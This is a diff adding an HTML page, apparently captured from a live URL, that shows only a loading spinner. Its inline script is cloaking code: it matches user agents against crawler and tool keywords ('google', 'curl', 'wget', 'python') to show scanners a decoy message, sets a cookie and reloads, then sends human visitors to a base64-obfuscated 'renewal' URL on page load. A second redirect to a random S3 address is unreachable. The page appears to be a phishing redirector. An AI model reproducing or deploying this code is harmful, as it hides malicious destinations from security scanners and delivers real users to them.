@@ -1,0 +1,99 @@
+<!-- url: https://r12.reportak.de/eb3qgvl1.html
+status: 200 -->
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <style>
+    body, html {
+      margin: 0;
+      padding: 0;
+      height: 100%;
+      background: #fff;
+    }
+    #loader {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background-color: #ffffff;
+      z-index: 9999;
+    }
+    .spinner {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #3498db;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <div id="loader">
+    <div class="spinner"></div>
+  </div>
+<script>
+    (async () => {
+      const ua = navigator.userAgent.toLowerCase();
+      const botKeywords = [
+        'bot', 'crawl', 'spider', 'slurp', 'google', 'bing', 'cashe', 'duckduck',
+        'yandex', 'facebook', 'python', 'curl', 'wget', 'libwww', 'httpclient'
+      ];
+
+      const encodedURL = "aHR0cHM6Ly9yZW5ld2FsLmJyZWlkYWwuY29tLz84Nzg5ODdSRlRHPUNYWFJUNjdZVUg=";
+
+	  const url = atob(encodedURL);
+
+      // Bot detection
+      if (botKeywords.some(keyword => ua.includes(keyword))) {
+        document.body.innerHTML = `
+          <h1>Welcome to our site!</h1>
+          <p>Please enable JavaScript to continue.</p>
+        `;
+        return;
+      }
+
+
+
+
+
+      const isHuman = document.cookie.includes('human=1');
+
+      if (!isHuman) {
+        document.cookie = "human=1; path=/";
+        location.reload();
+        return;
+      }
+
+      if (isHuman) {
+        // Redirect to the target URL
+        window.location.replace(url);
+        return;
+      }
+
+// JavaScript Example
+	function generateRandomName(length = 10) {
+	  const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
+	  return Array.from({ length }, () => chars[Math.floor(Math.random() * chars.length)]).join('');
+	}
+
+	const subdomain = generateRandomName(); // e.g., 'abc123xyz'
+	const filename = `${generateRandomName(8)}.html`;
+	const murl = `https://${subdomain}.s3.amazonaws.com/${filename}`;
+
+    window.location.replace(murl);
+	  
+    })();
+</script>
+</head>
+
+</body>
+</html>
